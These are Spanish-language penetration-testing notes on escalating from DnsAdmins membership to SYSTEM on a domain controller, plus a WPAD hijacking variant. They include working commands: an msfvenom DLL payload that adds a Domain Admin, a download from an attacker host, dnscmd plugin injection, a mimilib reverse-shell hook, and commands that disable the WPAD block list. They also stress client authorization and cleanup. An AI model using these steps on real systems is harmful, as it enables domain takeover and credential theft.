---
tags:
  - windows
  - privex
  - dnsadmin
---
## Conceptos Clave (TL;DR)

- El grupo `DnsAdmins` tiene acceso de gestión sobre el servicio DNS de Windows. Este servicio corre como `NT AUTHORITY\SYSTEM`, por lo que comprometerlo en un DC equivale a SYSTEM en el Domain Controller.
- El servicio DNS soporta plugins DLL personalizados. La clave de registro `ServerLevelPluginDll` permite especificar la ruta de una DLL arbitraria SIN verificación, y se carga la próxima vez que el servicio DNS se reinicia.
- Solo los miembros de `DnsAdmins` pueden modificar esta clave usando la utilidad `dnscmd` (no tienen permiso directo sobre el registro, solo a través de esta herramienta).
- Vector alternativo: `DnsAdmins` permite deshabilitar la Global Query Block List, lo que habilita ataques de registro WPAD para spoofing/captura de hashes (Responder/Inveigh/SMBRelay).

## Herramientas Clave

- **msfvenom**: Genera la DLL maliciosa (payload) que se cargará en el servicio DNS.
- **dnscmd.exe**: Utilidad nativa para configurar la ruta del plugin DLL en el registro (única forma que tienen los DnsAdmins de modificar esa clave).
- **Python http.server**: Sirve la DLL maliciosa para descargarla en el target.
- **sc.exe**: Consulta permisos (`sdshow`) y controla el servicio DNS (`stop`/`start`/`query`).
- **wmic**: Obtiene el SID del usuario actual para correlacionarlo con los permisos del servicio.
- **reg query / reg delete**: Inspección y limpieza de la clave de registro tras el ataque.
- **mimilib.dll (Mimikatz)**: DLL alternativa pre-hecha, modificable (kdns.c) para ejecutar comandos/reverse shell vía consulta DNS.
- **Responder / Inveigh**: Para explotar el vector WPAD una vez deshabilitado el Global Query Block List.
- **Get-ADGroupMember**: Confirma membresía en el grupo DnsAdmins.

## Metodología Paso a Paso

### Fase 1: Reconocimiento y Preparación
1. Confirmar membresía en el grupo `DnsAdmins` (propio o de un usuario comprometido).
2. Generar la DLL maliciosa con `msfvenom` (payload de ejecución de comando, ej. añadir usuario a Domain Admins, o reverse shell).
3. Levantar un servidor HTTP local para servir la DLL.
4. Descargar la DLL al host objetivo (normalmente desde una sesión ya obtenida en el DC o un host con acceso).

### Fase 2: Configuración del Plugin Malicioso
5. Ejecutar `dnscmd` para apuntar `ServerLevelPluginDll` a la ruta absoluta de la DLL. **Debe usarse ruta completa o el ataque falla.**
6. Si se ejecuta como usuario no privilegiado, fallará con `ERROR_ACCESS_DENIED`; debe ejecutarse como miembro de `DnsAdmins`.

### Fase 3: Verificación de Permisos sobre el Servicio
7. Obtener el SID del usuario actual (`wmic useraccount`).
8. Verificar permisos del servicio DNS con `sc sdshow DNS` y correlacionar el SID con la ACL (SDDL). Buscar permisos `RPWP` (SERVICE_START / SERVICE_STOP).
9. **Nota**: Ser miembro de DnsAdmins NO da automáticamente permiso para reiniciar el servicio; depende de la configuración del sysadmin.

### Fase 4: Ejecución (Trigger)
10. Si se tienen permisos `RPWP`: detener y arrancar el servicio DNS manualmente para forzar la carga de la DLL.
11. Si NO se tienen permisos para reiniciar: esperar a que el servicio/servidor se reinicie de forma natural (mantenimiento, parcheo, etc.).
12. Confirmar el resultado del payload (ej. verificar membresía en Domain Admins o recibir la reverse shell).

### Fase 5: Limpieza (Cleanup) — CRÍTICO en entorno de cliente real
13. **Siempre coordinar con el cliente antes de ejecutar este ataque** (es destructivo: puede tumbar el DNS de todo el dominio AD).
14. Confirmar que la clave `ServerLevelPluginDll` existe en el registro.
15. Eliminar la clave de registro.
16. Reiniciar el servicio DNS y confirmar que vuelve al estado `RUNNING`.
17. Validar funcionamiento de DNS en el entorno (ej. `nslookup` contra localhost u otro host).

### Vector Alternativo: WPAD Hijacking via DnsAdmins
18. Deshabilitar la Global Query Block List (que por defecto bloquea nombres como `wpad` e `isatap`).
19. Crear un registro DNS tipo A para `wpad` apuntando a la IP del atacante.
20. Cualquier máquina con WPAD en configuración por defecto enviará su tráfico proxy al atacante → capturar hashes con Responder/Inveigh o realizar SMBRelay.

## Cheat Sheet de Comandos

```bash
# Generar DLL maliciosa con msfvenom. Payload de ejecución de comando (exec)
# que añade un usuario al grupo Domain Admins. -f dll fuerza formato DLL.
msfvenom -p windows/x64/exec cmd='net group "domain admins" <USER> /add /domain' -f dll -o <PAYLOAD_NAME>.dll

# Servidor HTTP local para servir la DLL al target. Puerto a elección.
python3 -m http.server 7777
```

```powershell
# Descargar la DLL desde el servidor del atacante hacia el host target.
wget "http://<ATTACKER_IP>:7777/<PAYLOAD_NAME>.dll" -outfile "<PAYLOAD_NAME>.dll"

# Confirmar membresía de un usuario en el grupo DnsAdmins.
Get-ADGroupMember -Identity DnsAdmins

# (Vector WPAD) Deshabilitar la Global Query Block List en el DC.
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DC_FQDN>

# (Vector WPAD) Crear registro A "wpad" apuntando a la máquina del atacante.
Add-DnsServerResourceRecordA -Name wpad -ZoneName <DOMAIN> -ComputerName <DC_FQDN> -IPv4Address <ATTACKER_IP>
```

```cmd
:: Intentar cargar la DLL maliciosa configurando el plugin del servicio DNS.
:: Requiere RUTA ABSOLUTA. Falla con ERROR_ACCESS_DENIED si el usuario
:: no es miembro de DnsAdmins.
dnscmd.exe /config /serverlevelplugindll C:\Users\<USER>\Desktop\<PAYLOAD_NAME>.dll

:: Obtener el SID del usuario actual (necesario para correlacionar con la ACL del servicio).
wmic useraccount where name="<USER>" get sid

:: Mostrar la ACL (SDDL) del servicio DNS para verificar permisos del SID propio.
:: Buscar "RPWP" = SERVICE_START / SERVICE_STOP.
sc.exe sdshow DNS

:: Detener el servicio DNS (requiere permiso WP/Stop).
sc stop dns

:: Iniciar el servicio DNS (dispara la carga de la DLL maliciosa).
sc start dns

:: Verificar si el ataque tuvo éxito (ej. el usuario fue añadido a Domain Admins).
net group "Domain Admins" /dom

:: --- LIMPIEZA ---

:: Confirmar que la clave de registro del plugin malicioso existe.
reg query \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

:: Eliminar la clave de registro que apunta a la DLL maliciosa.
reg delete \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

:: Reiniciar el servicio DNS tras la limpieza.
sc.exe start dns

:: Confirmar que el servicio quedó en estado RUNNING.
sc query dns
```

```c
// Snippet de mimilib.dll (kdns.c) - función que se invoca en cada consulta DNS.
// Modificar la línea "system(...)" para ejecutar un one-liner de reverse shell
// o cualquier comando arbitrario. Compilar y servir como DLL del plugin.
DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

## Gotchas y Troubleshooting

- **Ruta absoluta obligatoria**: Si no se especifica la ruta completa al ejecutar `dnscmd /config /serverlevelplugindll`, el ataque no funciona correctamente.
- **Acceso indirecto al registro**: Los miembros de `DnsAdmins` NO tienen permiso directo sobre la clave de registro `ServerLevelPluginDll`; solo pueden modificarla a través de `dnscmd`.
- **Membresía ≠ control del servicio**: Pertenecer a `DnsAdmins` no implica tener permiso para reiniciar el servicio DNS. Hay que verificarlo explícitamente con `sc sdshow DNS` correlacionando el SID propio (permisos `RPWP` = start/stop).
- **Si no hay permiso para reiniciar el servicio**: Hay que esperar a que ocurra un reinicio natural del servidor/servicio (no se puede forzar).
- **Estado del servicio tras el ataque**: Es normal que al reiniciar el servicio con la DLL cargada, una consulta de estado posterior muestre que el servicio "failed to start correctly" en ciertos escenarios — no necesariamente indica que el payload falló.
- **Ataque altamente destructivo**: Modificar/reiniciar DNS en un DC puede tumbar la resolución de nombres de todo el entorno AD. SIEMPRE requiere autorización explícita del cliente antes de ejecutarlo en un engagement real.
- **Cleanup obligatorio**: Mientras la DLL maliciosa siga referenciada en el registro, el servicio DNS no podrá iniciar correctamente de nuevo. Hay que eliminar la clave `ServerLevelPluginDll` antes de reiniciar el servicio para restaurar el servicio a su estado normal.
- **Global Query Block List por defecto**: Bloquea nombres `wpad` e `isatap` precisamente porque son vectores de hijacking conocidos. `DnsAdmins` puede desactivar esta protección, habilitando el ataque WPAD.
- **Cualquier usuario de dominio** puede crear un objeto de equipo o registro DNS con esos nombres, pero el bloqueo por defecto lo impide salvo que se desactive (paso que requiere DnsAdmins).
- **Permisos de servicio vía SDDL**: Repasar sintaxis SDDL (ACE flags como `RPWP`, `CCDC`, etc.) si no se está familiarizado, ya que es clave para saber qué acciones se pueden ejecutar sobre el servicio sin necesidad de admin local.